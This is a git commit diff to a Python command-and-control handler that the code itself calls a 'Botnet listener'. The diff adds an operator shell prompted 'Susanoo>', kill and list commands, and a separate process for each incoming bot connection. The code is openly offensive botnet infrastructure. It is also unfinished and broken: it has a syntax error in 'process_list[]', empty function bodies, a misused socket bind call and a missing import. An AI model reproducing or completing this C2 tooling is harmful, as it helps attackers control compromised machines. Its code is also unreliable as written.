6accfd30c1cf4600cd2606ed2ade95af2a558810
root <root@localhost.localdomain>
2019-10-15 05:37:36 +0530

    Made some additions to handler

--- Python/Handler/C2handler.py
+++ Python/Handler/C2handler.py
@@ -8,23 +8,68 @@ import threading
 import queue
 
 q = queue.Queue()
+process_list[]
+
+def clientExecuter(client,client_addr,q):
+    # Write code to actually send the data to client and recieve to response and save it in a dict
+
+def handlerExecuter(cmd):
+    global process_list
+    
+    if(cmd[:4]=="kill"):
+        proc_name = cmd[5:]
+        flag = 0
+        for proc in process_list:
+            if(proc.name == proc_name):
+                proc.join()
+                print("[+] Process {proc_name} is terminated\n")
+                flag = 1
+                break
+        if(flag == 0):
+            print("[-] Process not found\n")
+    elif(cmd == "list"):
+        
+
+
+def handlerCmdShell(q):
+    global process_list
+    while(True):
+        handler_cmd = str(input("Susanoo> "))
+        if(handler_cmd == ""):
+            pass
+        elif(handler_cmd == "exit"):
+            for proc in process_list:
+                time.sleep(0.1)
+                proc.join()
+            time.sleep(5)
+            os._exit(0)
+            # Close all the process one by one and exit the program after that
+        else:
+            handlerExecuter(handler_cmd)
+
+
+
 
 def listener(lhost,lport,q):
-    try:
-        sock = socket.socket()
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind(lhost,lport)
-        sock.listen(600)
-        # Started the listener which can handle 600 connections.
-        print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
+    sock = socket.socket()
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind(lhost,lport)
+    sock.listen(100)
+    # Started the listener which can handle 100 connections.
+    print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
         
-        handlercmdthread = handlercmd(q)
-        handlercmdthread.start()
-        # Handler cmd shell started here.
-        # It is running as serperate thread to give us an free cmd shell while listener runs in background.
+    handler_cmd_thread = threading.Thread(target=handlerCmdShell,args=(q,))
+    handler_cmd_thread.start()
+    # Handler cmd shell started here.
+    # It is running as serperate thread to give us an free cmd shell while listener runs in background.
 
-        try:
-            (client_addr,client_port) = sock.accept()
+    while(True):
+        global process_list
+        (client,client_addr) = sock.accept()
+        new_process = Process(target=clientExecuter,args=(client,client_addr,q))
+        process_list.append(new_process)
+        new_process.start()
+        # Created new process for every connection that I get and save the process in process_list 
 
 
 
